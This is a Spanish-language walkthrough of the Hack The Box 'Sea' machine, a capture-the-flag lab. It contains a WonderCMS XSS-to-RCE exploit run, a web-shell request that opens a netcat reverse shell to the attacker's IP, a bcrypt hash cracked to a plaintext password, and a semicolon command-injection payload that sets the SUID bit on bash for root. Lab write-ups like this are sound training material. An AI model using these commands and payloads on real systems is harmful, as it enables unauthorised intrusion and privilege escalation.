---
tags:
title: Sea - Easy (HTB)
permalink: /Sea-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash
nmap -sCV -p22,80 10.10.11.28                              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 21:08 EDT
Nmap scan report for 10.10.11.28
Host is up (0.28s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.38 seconds
```

## Service enumeration

### Port 80

Por el puerto `80`se nos presenta una pagina web, que al parecer esta vacia de informacion de la que nos podamos aprovechar.
![Untitled 10 1](images/Untitled 10 1.jpg)

Si nos vamos a la seccion de `how to participate`, nos aparece un boton de contacto.
![Untitled 11 1](images/Untitled 11 1.jpg)

Si nos clickeamos ahi nos redirige a la siguiente pagina.

![Untitled 12 1](images/Untitled 12 1.jpg)

Podemos intentar cosas como colocar nuestra direccion en la seccion `website` y vemos que nos llega la peticion, por lo que podriamos intentar mediante un `xss` robar la cookie de session del usuario que por detras nos este haciendo la peticion a nuestro servidor en `python` ya que la flag `http-only` esta seteada a false, pero no tuve exito.
Si nos vamos al codigo fuente de la pagina vemos que carga una imagen de la ruta `/themes/bike` por lo que podriamos enumerar en busca de otros archivos en la misma ruta o directamente en la ruta `themes`

### Gobuster enumeration

```bash
gobuster dir -u http://sea.htb/themes/bike/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 -x php,txt,js,html,bak,php.bak,zip,md -q --exclude-length 199
/home                 (Status: 200) [Size: 3650]
/img                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/img/]
/version              (Status: 200) [Size: 6]
/css                  (Status: 301) [Size: 239] [--> http://sea.htb/themes/bike/css/]
/README.md            (Status: 200) [Size: 318]
/summary              (Status: 200) [Size: 66]
/theme.php            (Status: 500) [Size: 227]
/404                  (Status: 200) [Size: 3341]
```

Nos descubre un archivo `README.md`, y las rutas , `/version`, `summary`, y demas. En la ruta `version` nos muestra una version de algo que por el momento no conocemos.

![Untitled 13 1](images/Untitled 13 1.jpg)

Viendo el contenido del `README.md`.

![Untitled 14 1](images/Untitled 14 1.jpg)
# Explotacion

Vemos que se trata de `Wonder CMS`, si buscamos por ese `cms` y la version `3.2.0` nos aparece el siguiente [exploit](https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE) que se aprovecha de un `XSS` en la instalacion de un modulo en la pagina.

Clonamos el repositorio

```bash 
git clone https://github.com/thefizzyfish/CVE-2023-41425-wonderCMS_RCE
```

Preparamos nuestro servidor con `python`.

```bash 
python3 -m http.server 8000
```

Ejecutamos el script, para q nos cree el payload a enviar en la pagina de contacto.

```bash
python3 CVE-2023-41425.py -rhost http://sea.htb/loginURL -lhost 10.10.16.4 -lport 9001 -sport 8000
```

Enviamos el payload creado.

![Untitled 15 1](images/Untitled 15 1.jpg)

Y detectamos movimiento en nuestro servidor.

```bash
python3 -m http.server 8000  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.28 - - [22/Sep/2025 22:36:46] "GET /cookie.js HTTP/1.1" 200 -
10.10.11.28 - - [22/Sep/2025 22:36:53] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [22/Sep/2025 22:36:55] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [22/Sep/2025 22:36:56] "GET /shell.zip HTTP/1.1" 200 -
10.10.11.28 - - [22/Sep/2025 22:36:57] "GET /shell.zip HTTP/1.1" 200 -
```

Por lo que podemos intuir que la explotacion se ejecuto. Por lo que con `curl` podemos verificar que en la ruta `/themes` se haya depositado nuestro payload.

```bash
curl -s -X GET 'http://sea.htb/themes/shell/shell.php?cmd=whoami'
www-data
```

Vemos que efectivamente tenemos ejecucion remota de comandos. Por lo que preparamos nuestro listener a la espera de una reverse shell.

```bash 
nc -nlvp 4444
```

```bash
curl -s -X GET 'http://sea.htb/themes/shell/shell.php?cmd=busybox%20nc%2010.10.16.4%204444%20-e%20bash'
```

Una vez dentro de la maquina y habiendo hecho el tratamiento de la `tty`, en la ruta `/var/www/sea/data`, hay un archivo de base de datos en `.js`
```bash
www-data@sea:/var/www/sea/data$ cat database.js 
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2025\/09\/23 02:36:46": "127.0.0.1",
            "2025\/09\/23 02:31:15": "127.0.0.1",
            "2025\/09\/23 02:28:05": "127.0.0.1",
            "2025\/09\/23 02:27:05": "127.0.0.1",
            "2024\/07\/31 15:17:10": "127.0.0.1"
        },
        "lastModulesSync": "2025\/09\/23",
        "customModules": {
            "themes": {},
            "plugins": {}
        },
        "menuItems": {
            "0": {
                "name": "Home",
                "slug": "home",
                "visibility": "show",
                "subpages": {}
            },
            "1": {
                "name": "How to participate",
                "slug": "how-to-participate",
                "visibility": "show",
                "subpages": {}
            }
        },
        "logoutToLoginScreen": {}
    },
    "pages": {
        "404": {
            "title": "404",
            "keywords": "404",
            "description": "404",
            "content": "<center><h1>404 - Page not found<\/h1><\/center>",
            "subpages": {}
        },
        "home": {
            "title": "Home",
            "keywords": "Enter, page, keywords, for, search, engines",
            "description": "A page description is also good for search engines.",
            "content": "<h1>Welcome to Sea<\/h1>\n\n<p>Hello! Join us for an exciting night biking adventure! We are a new company that organizes bike competitions during the night and we offer prizes for the first three places! The most important thing is to have fun, join us now!<\/p>",
            "subpages": {}
        },
        "how-to-participate": {
            "title": "How to",
            "keywords": "Enter, keywords, for, this page",
            "description": "A page description is also good for search engines.",
            "content": "<h1>How can I participate?<\/h1>\n<p>To participate, you only need to send your data as a participant through <a href=\"http:\/\/sea.htb\/contact.php\">contact<\/a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.<\/p>",
            "subpages": {}
        }
    },
    "blocks": {
        "subside": {
            "content": "<h2>About<\/h2>\n\n<br>\n<p>We are a company dedicated to organizing races on an international level. Our main focus is to ensure that our competitors enjoy an exciting night out on the bike while participating in our events.<\/p>"
        },
        "footer": {
            "content": "©2024 Sea"
        }
    }
}
```

Parece que hay una contraseña en formato `bcrypt` con escapes en las `/` por lo que lo acomodamos y lo guardamos en un archivo con nombre `hash` y lo rompemos con `hashcat`

```bash
hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt          
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 5593/11251 MB (2048 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2b$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2b$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Mon Sep 22 22:46:12 2025 (10 secs)
Time.Estimated...: Mon Sep 22 22:46:22 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      316 H/s (6.02ms) @ Accel:16 Loops:8 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3072/14344385 (0.02%)
Rejected.........: 0/3072 (0.00%)
Restore.Point....: 2816/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: pirate -> dangerous
Hardware.Mon.#1..: Util: 90%

Started: Mon Sep 22 22:46:09 2025
Stopped: Mon Sep 22 22:46:23 2025
```

Anteriormente viendo el contenido del `/etc/passwd` vemos que el usuario con una `bash` asignada era `amay`por lo que podríamos migrar a ese usuario con la password encontrada.

```bash
www-data@sea:/var/www/sea/data$ su amay
Password:
```
# Post-Explotacion  /  Privilege escalation

Viendo los servicios que correr localmente, vemos lo siguiente:

```bash
netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:40011         0.0.0.0:*               LISTEN      1369/chrome         
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      5197/php            
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      1639/systemd-resolv 
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1177/sshd: /usr/sbi 
tcp6       0      0 :::80                   :::*                    LISTEN      1178/apache2        
tcp6       0      0 :::22                   :::*                    LISTEN      1177/sshd: /usr/sbi 
udp        0      0 127.0.0.53:53           0.0.0.0:*                           1639/systemd-resolv 
udp        0      0 0.0.0.0:68              0.0.0.0:*                           804/dhclient
```

Por lo que tenemos que hacer un `port-forwarding` para que esos puertos sean accesibles desde nuestra maquina.

```bash
ssh amay@10.10.11.28 -L 40011:127.0.0.1:40011 -L 8080:127.0.0.1:8080
```

![Untitled 16 1](images/Untitled 16 1.jpg)

Vemos que aparece una pagina de monitoreo del sistema el cual nos permite analizar los archivos `access.log` y `auth.log`, si interceptamos la peticion podemos intentar leer un archivo privilegiado, y tratando de concatenar otro comando con `;` suponiendo que lo que pasa por detras es un cat `archivo.txt` podemos tratar de hacer algo como `; id` para que despues de mostrar el contenido nos muestre el output del comando `id`

![Untitled 17 1](images/Untitled 17 1.jpg)

Vemos que nos permite visualizar la flag de `root`, pero probemos con intentar ganar acceso al sistema como dicho user.
Sabiendo que el comando luego de la ; nos lo ejecuta podriamos repetir el proceso para que por ejemplo asigne el bit `suid` a la bash.

Ejemplo
```
/test.txt;id;chmod u+s /bin/bash
```

Chequeemos primero los permisos de la bash

```bash
amay@sea:/dev/mapper$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

	Y ahora coloquemos este comando

```bash
log_file=;chmod+u%2bs+/bin/bash;id&analyze_log=
```

Volvemos a chequear los permisos para verificar que se haya asignado el permiso que queriamos.
```bash
amay@sea:/dev/mapper$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

Efectivamente se ejecuto, nos queda convertir nuestra shell a una como `root`.

```bash
amay@sea:/dev/mapper$ bash -p
bash-5.0# whoami
root
```

```bash 
cat /root/root.txt
```
